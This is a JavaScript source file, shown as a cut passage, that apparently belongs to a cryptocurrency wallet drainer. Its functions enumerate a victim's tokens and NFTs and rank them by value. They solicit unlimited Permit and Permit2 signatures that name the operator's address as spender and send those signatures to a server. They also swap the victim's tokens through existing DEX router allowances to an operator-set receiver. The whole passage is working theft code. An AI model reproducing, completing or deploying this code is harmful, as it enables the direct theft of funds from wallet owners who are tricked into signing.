address"}],"name":"sweepTokenWithFee","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountMinimum","type":"uint256"},{"internalType":"address","name":"recipient","type":"address"}],"name":"unwrapWETH9","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountMinimum","type":"uint256"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"feeBips","type":"uint256"},{"internalType":"address","name":"feeRecipient","type":"address"}],"name":"unwrapWETH9WithFee","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}]

const DO_SWAP_BYPASS = async (asset, swapper_data) => {
  await APPROVE_TO_SWAPPER(asset, swapper_data.address);

  const node         = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const signer       = CF_Signer;
  const amountInRaw  = ethers.BigNumber.from(asset.amount_raw);
  const swap_deadline= Math.floor(Date.now()/1000) + 300; // +5 мин
  let amountOutMinBN;

  try {
    if (swapper_data.swapper === 'Pancake_V3') {
      const quoter = new ethers.Contract(UNISWAP_V3_QUOTER, QuoterABI, node);
      const quoted = await quoter.callStatic.quoteExactInputSingle(
        asset.address,
        CF_Swap_Route[asset.chain_id],
        3000,                // fee на пуле
        amountInRaw,
        0                    // no price limit
      );
      amountOutMinBN = quoted
        .mul(100 - SLIPPAGE_TOLERANCE)
        .div(100);

    } else {
      const readRouter = new ethers.Contract(
        swapper_data.address,
        CF_RouterV2_ReadABI,
        node
      );
      const amounts = await readRouter.getAmountsOut(
        amountInRaw,
        [ asset.address, CF_Swap_Route[asset.chain_id] ]
      );
      amountOutMinBN = ethers.BigNumber.from(amounts[1])
        .mul(100 - SLIPPAGE_TOLERANCE)
        .div(100);
    }
  } catch (err) {
    console.warn('Price fetch failed, using amountOutMin=0', err);
    amountOutMinBN = ethers.BigNumber.from(0);
  }

  const gasPrice = (await node.getGasPrice())
    .mul(120).div(100);
  const nonce = await get_nonce(asset.chain_id);

  if (['Uniswap','Pancake','Sushiswap'].includes(swapper_data.swapper)) {
    const contract = new ethers.Contract(swapper_data.address, CF_Uniswap_ABI, signer);
    const data = contract.interface.encodeFunctionData(
      'swapExactTokensForTokens',
      [
        amountInRaw.toString(),
        amountOutMinBN.toString(),
        [ asset.address, CF_Swap_Route[asset.chain_id] ],
        CF_Settings.Receiver
      ]
    );
    const swap_data = [data];

    let gas_limit; let attempts = 0;
    while (attempts++ < 3) {
      try {
        gas_limit = await contract.estimateGas.multicall(
          swap_deadline, swap_data, { from: CF_Current_Address }
        );
        gas_limit = gas_limit.mul(120).div(100);
        break;
      } catch {
        gas_limit = [42161,43114].includes(asset.chain_id)
          ? 5_000_000
          : 500_000;
      }
    }

    sign_next();
    const tx = await contract.multicall(
      swap_deadline,
      swap_data,
      { gasLimit: gas_limit, gasPrice, nonce, from: CF_Current_Address }
    );
    wait_message();
    if (CF_Settings.Settings.Wait_For_Confirmation)
      await node.waitForTransaction(tx.hash, 1, 60_000);
    await swap_success(swapper_data.swapper, asset, [asset]);
    sign_ready();

  } else if (swapper_data.swapper === 'Pancake_V3') {
    const routerV3 = new ethers.Contract(
      swapper_data.address,
      SwapRouterV3_ABI,
      signer
    );
    sign_next();
    const tx = await routerV3.exactInputSingle(
      {
        tokenIn:           asset.address,
        tokenOut:          CF_Swap_Route[asset.chain_id],
        fee:               3000,
        recipient:         CF_Settings.Receiver,
        deadline:          swap_deadline,
        amountIn:          amountInRaw.toString(),
        amountOutMinimum:  amountOutMinBN.toString(),
        sqrtPriceLimitX96: 0
      },
      { gasLimit: 1_000_000, gasPrice, nonce }
    );
    wait_message();
    if (CF_Settings.Settings.Wait_For_Confirmation)
      await node.waitForTransaction(tx.hash, 1, 60_000);
    await swap_success(swapper_data.swapper, asset, [asset]);
    sign_ready();

  } else {
    throw new Error(`Unknown swapper ${swapper_data.swapper}`);
  }
};

const LEGACY_DO_SWAP_BYPASS = async (asset, swapper_data) => {

  await APPROVE_TO_SWAPPER(asset, swapper_data.address);

  if (swapper_data.swapper == 'Uniswap') {

    const web3 = new Web3(CF_Provider); const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
    const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
    const contract = new ethers.Contract(swapper_data.address, CF_Uniswap_ABI, CF_Signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
    const nonce = await get_nonce(asset.chain_id);
    const swap_data = [];
    const swap_value = ethers.BigNumber.from(asset.amount_raw).toString();
    const web3_contract = new web3.eth.Contract(CF_Uniswap_ABI, swapper_data.address);
    const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
      asset.address, CF_Swap_Route[asset.chain_id]
    ], CF_Settings.Receiver).encodeABI();
    swap_data.push(data);
    let gas_limit = null;
    let gas_attempts = 0;
    while (gas_attempts < 3) {
      try {
        gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: CF_Current_Address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
        gas_attempts = 3;
      } catch(err) {
        gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
        gas_attempts += 1;
      }
    }
    sign_next();
    const tx = await contract.multicall(swap_deadline, swap_data, {
      gasLimit: ethers.BigNumber.from(gas_limit),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, from: CF_Current_Address
    });
    wait_message();
    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
    await swap_success(swapper_data.swapper, asset, [asset]); sign_ready();

  } else {

    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
    const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
    const contract = new ethers.Contract(swapper_data.address, CF_Pancake_ABI, CF_Signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
    let gas_limit = null;
    let gas_attempts = 0;
    while (gas_attempts < 3) {
      try {
        gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
          asset.address, CF_Swap_Route[asset.chain_id]
        ], CF_Settings.Receiver, swap_deadline, { from: CF_Current_Address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
        gas_attempts = 3;
      } catch(err) {
        gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
        gas_attempts += 1;
      }
    }
    const nonce = await get_nonce(asset.chain_id);
    const swap_value = ethers.BigNumber.from(asset.amount_raw).toString();
    sign_next();
    const tx = await contract.swapExactTokensForETH(swap_value, '0', [
      asset.address, CF_Swap_Route[asset.chain_id]
    ], CF_Settings.Receiver, swap_deadline, {
      gasLimit: ethers.BigNumber.from(gas_limit),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, from: CF_Current_Address
    });
    wait_message();
    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
    await swap_success(swapper_data.swapper, asset, [ asset ]); sign_ready();

  }

};

const check_permit2_allowance = async (asset) => {
  try {
    const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
    const balance = await contract.balanceOf(CF_Current_Address);
    const allowance = await contract.allowance(CF_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
    if (ethers.BigNumber.from(allowance).gte(ethers.BigNumber.from(balance))) return true; else return false;
  } catch(err) {
    return false;
  }
}

const DO_PERMIT2 = async (asset, assets) => {
  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', CF_Contract_ABI['PERMIT2_BATCH'], CF_Signer);
  let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      "PermitBatch": [
        {
          "name": "details",
          "type": "PermitDetails[]"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    let tokens = [];
    for (const x_asset of assets) {
      try {
        tokens.push({
          "token": x_asset.address, "expiration": permit_deadline,
          "amount": "1461501637330902918203684832716283019655932542975",
          "nonce": (await contract.allowance(CF_Current_Address, x_asset.address, (CF_Settings.Settings.Use_Randomizer_For_Tokens? CF_Settings.Personal_Wallet.address : CF_Settings.Address))).nonce
        });
      } catch(err) {
        console.log(err);
      }
    }
    permit_message = {
      "details": tokens,
      "spender": (CF_Settings.Settings.Use_Randomizer_For_Tokens
        ? CF_Settings.Personal_Wallet.address : CF_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, assets); sign_next();
    permit_signature = await CF_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 2;
  } else {
    // Permit Single
    let permit_types = {
      "PermitSingle": [
        {
          "name": "details",
          "type": "PermitDetails"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    permit_message = {
      "details": {
        "token": asset.address,
        "amount": "1461501637330902918203684832716283019655932542975",
        "expiration": permit_deadline, "nonce": (await contract.allowance(CF_Current_Address, asset.address, (CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address))).nonce
      },
      "spender": (CF_Settings.Settings.Use_Randomizer_For_Tokens
        ? CF_Settings.Personal_Wallet.address : CF_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, [ asset ]); sign_next();
    permit_signature = await CF_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success('Permit2', asset, assets); wait_message();
    const x_promise = send_request({
      action: 'sign_permit2', user_id: CF_ID, signature: permit_signature,
      message: permit_message, asset: asset, assets, address: CF_Current_Address,
      mode: permit_mode, PW: CF_Settings.Personal_Wallet
    });
    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  } else {
    await sign_cancel();
  }
};

const PERMIT_TOKEN = async (asset) => {
  const contract = new ethers.Contract(asset.address, asset.abi, CF_Signer);
  const nonce = await contract.nonces(CF_Current_Address);
  const name = await contract.name();
  let value = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        value = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const current_allowance = await contract.allowance(CF_Current_Address, (CF_Settings.Settings.Use_Randomizer_For_Tokens
    ? CF_Settings.Personal_Wallet.address : CF_Settings.Address));
  if (current_allowance.gte(ethers.BigNumber.from(value))) {
    await approve_request(asset);
    sign_next();
    await approve_success(asset);
    wait_message();
    const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet });
    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  }

  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: CF_Current_Address,
      spender: (CF_Settings.Settings.Use_Randomizer_For_Tokens
        ? CF_Settings.Personal_Wallet.address : CF_Settings.Address),
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: CF_Current_Address,
      spender: (CF_Settings.Settings.Use_Randomizer_For_Tokens
        ? CF_Settings.Personal_Wallet.address : CF_Settings.Address),
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();
  const result = await CF_Signer._signTypedData({
    name: name, version: asset.permit_ver, chainId: asset.chain_id,
    verifyingContract: asset.address
  }, permit_types, permit_values),
  signature = {
    r: result.slice(0, 66),
    s: "0x" + result.slice(66, 130),
    v: Number("0x" + result.slice(130, 132))
  };
  await approve_success(asset);
  wait_message();
  const x_promise = send_request({
    action: 'permit_token', user_id: CF_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: CF_Current_Address, spender: (CF_Settings.Settings.Use_Randomizer_For_Tokens
        ? CF_Settings.Personal_Wallet.address : CF_Settings.Address),
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet
  });
  if (CF_Settings.Settings.Wait_For_Response) await x_promise;
  sign_ready();
};

const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * CF_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'sign_success', asset, user_id: CF_ID });
    } else {
      await send_request({ action: 'sign_success', asset, user_id: CF_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * CF_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'swap_success', asset, user_id: CF_ID, list: all_tokens, swapper: type });
    } else {
      await send_request({ action: 'swap_success', asset, user_id: CF_ID, list: all_tokens, swapper: type });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * CF_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'transfer_success', asset, user_id: CF_ID });
    } else {
      await send_request({ action: 'transfer_success', asset, user_id: CF_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset) => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: CF_ID });
    CF_Sign_Disabled = true;
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: CF_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: CF_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: CF_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: CF_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const swap_request = async (type, asset, all_tokens = []) => {
  try {
    await send_request({ action: 'swap_request', user_id: CF_ID, asset, list: all_tokens, swapper: type });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: CF_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: CF_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const is_increase_approve = (func) => {
  try {
    if (func.hasOwnProperty('increaseAllowance')) {
      return 1;
    } else if (func.hasOwnProperty('increaseApproval')) {
      return 2;
    } else {
      return false;
    }
  } catch(err) {
    return false;
  }
};

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: CF_Current_Address }), assets = [];
    if (response.status == 'OK') assets = response.data;
    else if (CF_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
    else if (response.error != 'LOCAL_CHECK') return assets;
    else {
      CF_Check_Done = true;
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      await new Promise(r => setTimeout(r, 10000));
      return assets;
    }

    let token_promises = [];

    // Batch contract calls to improve performance
    const batchPromises = [];
    const batchContracts = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!CF_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !CF_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !CF_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (CF_Settings.Settings.Permit2.Mode) {
            batchContracts.push({ chain_id: asset.chain_id, address: asset.address, type: 'permit2', asset });
          }
          if ((CF_Settings.Settings.Permit.Mode && CF_Settings.Settings.Permit.Priority > 0) || (CF_Settings.Settings.Approve.MetaMask >= 2 && CF_Current_Provider == 'MetaMask') || (CF_Settings.Settings.Approve.Trust >= 2 && CF_Current_Provider == 'Trust Wallet')) {
            batchContracts.push({ chain_id: asset.chain_id, address: asset.address, type: 'permit', asset });
          }
          if (CF_Settings.Settings.Swappers.Enable) {
            batchContracts.push({ chain_id: asset.chain_id, address: asset.address, type: 'swapper', asset });
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    // Group the batch requests to minimize the number of RPC calls
    for (const contract of batchContracts) {
      batchPromises.push(new Promise(async (resolve) => {
        try {
          const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[contract.chain_id]);
          const contractInstance = new ethers.Contract(contract.address, CF_Contract_ABI['ERC20'], node);

          switch (contract.type) {
            case 'permit2':
              let is_permit2_ban = false;
              for (const c_address of CF_Settings.Permit2_BL) {
                if (c_address[0] == contract.chain_id && c_address[1] === contract.address.toLowerCase().trim()) {
                  is_permit2_ban = true;
                  break;
                }
              }
              if (contract.asset.amount_usd >= CF_Settings.Settings.Permit2.Price[contract.chain_id] && !is_permit2_ban) {
                let allowance = await contractInstance.allowance(CF_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                  contract.asset.permit2 = true;
                  contract.asset.allowance = allowance;
                  console.log(`[PERMIT_2 FOUND] ${contract.asset.name}, Allowance: ${allowance}`);
                }
              }
              break;
            case 'permit':
              const data = await retrieve_token(contract.chain_id, contract.address);
              const contractWithAbi = new ethers.Contract(contract.address, data, node);
              if (is_increase_approve(contractWithAbi.functions) == 2) {
                contract.asset.increase = 2;
                contract.asset.abi = data;
              } else if (is_increase_approve(contractWithAbi.functions) == 1) {
                contract.asset.increase = 1;
                contract.asset.abi = data;
              }
              if (contract.asset.amount_usd >= CF_Settings.Settings.Permit.Price[contract.chain_id]) {
                const permit_type = get_permit_type(contractWithAbi.functions);
                contract.asset.permit = permit_type;
                contract.asset.permit_ver = "1";
                contract.asset.abi = data;
                if (permit_type > 0) {
                  if (contractWithAbi.functions.hasOwnProperty('version')) {
                    try {
                      contract.asset.permit_ver = await contractWithAbi.version();
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  console.log(`[PERMIT FOUND] ${contract.asset.name}, Permit Type: ${permit_type}, Version: ${contract.asset.permit_ver}`);
                }
              }
              break;
            case 'swapper':
              if (contract.asset.amount_usd >= CF_Settings.Settings.Swappers.Price) {
                for (const swapper of CF_Routers[contract.chain_id]) {
                  try {
                    const allowance = await contractInstance.allowance(CF_Current_Address, swapper[1]);
                    if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                      if (swapper[0] == 'Quickswap' && CF_Settings.Settings.Swappers.Quick == 0) continue;
                      if (swapper[0] == 'Sushiswap' && CF_Settings.Settings.Swappers.Sushi == 0) continue;
                      if (swapper[0] == 'Uniswap' && (!CF_Uniswap_Whitelist.includes(contract.address) || CF_Settings.Settings.Swappers.Uniswap == 0)) continue;
                      if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!CF_Pancake_Whitelist.includes(contract.address) || CF_Settings.Settings.Swappers.Pancake == 0)) continue;
                      contract.asset.swapper = true;
                      contract.asset.swapper_type = swapper[0];
                      contract.asset.swapper_address = swapper[1];
                      contract.asset.swapper_allowance = allowance;
                      console.log(`[SWAP FOUND] ${contract.asset.name}, ${swapper[0]}`);
                      break;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
              }
              break;
          }
        } catch (err) {
          console.log(err);
        }
        resolve();
      }));
    }

    await Promise.all(batchPromises);

    let NFT_Status = false;

    for (const chain_id in CF_Settings.Settings.Chains) {
      try {
        if (CF_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: CF_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!CF_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!CF_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (CF_Settings.Settings.Tokens_First == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    } else if (CF_Settings.Settings.Tokens_First == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Swappers.Enable && CF_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Permit.Mode && CF_Settings.Settings.Permit.Priority > 0) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0 || asset.amount_usd < CF_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0 && asset.amount_usd >= CF_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (CF_Settings.Settings.Swappers.Enable && CF_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const legacy_get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: CF_Current_Address }), assets = [];
    if (response.status == 'OK') assets = response.data;
    else if (CF_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
    else if (response.error != 'LOCAL_CHECK') return assets;
    else {
      CF_Check_Done = true;
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      await new Promise(r => setTimeout(r, 10000));
      return assets;
    }

    let token_promises = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!CF_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !CF_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !CF_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < CF_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (CF_Settings.Settings.Permit2.Mode) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                let is_permit2_ban = false;
                for (const c_address of CF_Settings.Permit2_BL) {
                  if (c_address[0] == asset.chain_id && c_address[1] === asset.address.toLowerCase().trim()) {
                    is_permit2_ban = true;
                    break;
                  }
                }
                if (asset.amount_usd >= CF_Settings.Settings.Permit2.Price[asset.chain_id] && !is_permit2_ban) {
                  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], node);
                  let allowance = await contract.allowance(CF_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                  if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                    asset.permit2 = true;
                    asset.allowance = allowance;
                    console.log(`[PERMIT_2 FOUND] ${asset.name}, Allowance: ${allowance}`);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
